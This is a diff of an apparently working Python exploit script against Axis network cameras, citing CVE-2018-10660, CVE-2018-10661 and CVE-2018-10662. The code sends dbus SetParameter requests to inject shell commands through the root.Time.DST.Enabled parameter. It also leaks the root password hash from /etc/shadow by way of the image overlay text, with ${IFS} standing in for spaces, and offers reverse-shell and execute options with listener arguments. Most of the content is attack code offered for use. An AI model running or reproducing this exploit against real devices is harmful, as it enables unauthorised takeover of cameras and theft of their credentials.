@@ -8,11 +8,7 @@ CVE-2018-10660      Shell Command Injection
 CVE-2018-10661      Access Control Bypass
 CVE-2018-10662      Exposed Insecure Interface
 
-USAGE:
-./exploit.py -t TARGET_IP -tp TARGET_PORT -l LISTEN_IP -lp LISTEN_PORT
-
 """
-import os
 import requests
 import random
 import string
@@ -36,7 +32,6 @@ parser.add_argument("-L",   "--listen", type=str, help="Listener IP (if not spec
 parser.add_argument("-LP",  "--listen-port", type=int, help="Listener port", default="1337")
 
 # Overlay arguments
-#parser.add_argument("-o",   "--overlay", action="store_true", help="Modify image overlay text")
 parser.add_argument("-ot",   "--overlay-text", type=str, help="Specify image overlay text")
 parser.add_argument("-ol",   "--overlay-leak", action="store_true", help="Exfiltrate root password hash from shadow with image text overlay")
 
@@ -104,6 +99,7 @@ if (args.execute != None and args.reverse):
     logging(f"Reverse and Execute specified:\n\tOverriding --reverse command with --execute command.\n")
 
 logging(f"Configuration\n-------------\nTarget: {target_proto}://{target_ip}:{target_port}/{target_file}\nListener: {listen_ip}:{listen_port}\nOverlay: {overlay_text}\nProxy: {req_proxy}\n")
+
 if (args.reverse or args.execute != None):
     logging(f"Command: {exe_cmd}\n")
 logging(f"\n")
@@ -155,6 +151,7 @@ target_url = f"{target_proto}://{target_ip}:{target_port}/{target_file}/{gen_cha
 # Test for possible device exploitation
 def test_connect():
     global stage
+    
     TEST_DATA = {
         'action': gen_chars(5),
         'return_page': gen_chars(5),
@@ -183,21 +180,18 @@ def sync_req():
     
     logging(f"Syncing parameters...\t\t\t\t\t\t")
     send_req(SYNC_DATA)
-    # if http_check(requests.post(f"{target_url}", data=SYNC_DATA, proxies=req_proxy, allow_redirects=False)):
-    #     exit(1)
     sleep(1)
 
 # Reset root.Time.DST.Enabled to 'yes' for a baseline value
 def dst_reset_req():
     global stage
+    
     RESET_DATA = {
         'action': "dbus",
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:yes",
     }
     
     logging(f"Stage {stage}: Resetting root.Time.DST.Enabled\t\t\t")
-    # if http_check(requests.post(f"{target_url}", data=RESET_DATA, proxies=req_proxy, allow_redirects=False)):
-    #     exit(1)
     send_req(RESET_DATA)
     sync_req()
     stage += 1   
@@ -210,14 +204,13 @@ def dst_reset_req():
 # Enable Image.I0.Text.TextEnabled overlay
 def overlay_enable():
     global stage
+    
     OVERLAY_DATA = {
         'action': "dbus",
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.TextEnabled string:yes",
     }
 
     logging(f"Stage {stage}: Attempt to enable image overlay text...\t\t")
-    # if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
-    #     exit(1)
     send_req(OVERLAY_DATA)
     sync_req()
     
@@ -225,7 +218,6 @@ def overlay_enable():
 # Modify Image.I0.Text.String overlay
 def overlay_req():
     global stage
-
     overlay_enable()
 
     OVERLAY_DATA = {
@@ -234,8 +226,6 @@ def overlay_req():
     }
 
     logging(f"Stage {stage}: Attempt to modify image overlay text...\t\t")
-    # if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
-    #     exit(1)
     send_req(OVERLAY_DATA)
     sync_req()
     stage += 1
@@ -244,16 +234,8 @@ def overlay_req():
 # Modify Image.I0.Text.String to leak data
 def overlay_leak():
     global stage
-
     overlay_enable()
     
-    # if (cmd == ""):
-    #     cmd = "$(grep 'root' /etc/shadow | cut '-d:' -f2)"
-    
-    # print(f"leak command: {cmd}")
-    # exit(0)
-    
-    # leak_cmd = 'sed -ir \"s\|ABCD\|$(grep \'root\' /etc/shadow | cut \'-d:\' -f2)\|g\" /etc/sysconfig/image_text.conf'
     leak_cmd = "$(grep 'root' /etc/shadow | cut '-d:' -f2)"
     overlay_leak_cmd = f"gdbus call --system --dest com.axis.PolicyKitParhand --object-path /com/axis/PolicyKitParhand --method com.axis.PolicyKitParhand.SetParameter Image.I0.Text.String {leak_cmd}"
     overlay_leak_cmd_ifs = overlay_leak_cmd.replace(' ', "${IFS}")
@@ -264,11 +246,6 @@ def overlay_leak():
     }
 
     logging(f"Stage {stage}: Modifying image text overlay...\t\t\t")
-    # print(f"{overlay_leak_cmd_ifs}")
-    # exit(0)
-
-    # if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
-    #     exit(1)
     send_req(OVERLAY_DATA)
     sleep(1)
     sync_req()
@@ -291,8 +268,6 @@ def dst_command_req():
     }
     
     logging(f"Stage {stage}: Injecting command to root.Time.DST.Enabled...\t\t")
-    # if http_check(requests.post(f"{target_url}", data=COMMAND_DATA, proxies=req_proxy, allow_redirects=False)):
-    #     exit(1)
     send_req(COMMAND_DATA)
     logging("+ Running sync to execute command\n")
     sync_req()
@@ -307,7 +282,8 @@ def main():
     if (args.test):
         exit(0)
 
-#    logging("+ Preparing to execute exploit.\n")
+    if (overlay_text != None or args.overlay_leak or (args.reverse or args.execute != None)):
+        logging("+ Preparing to execute exploit.\n")
       
     if (overlay_text != None):
         overlay_req()
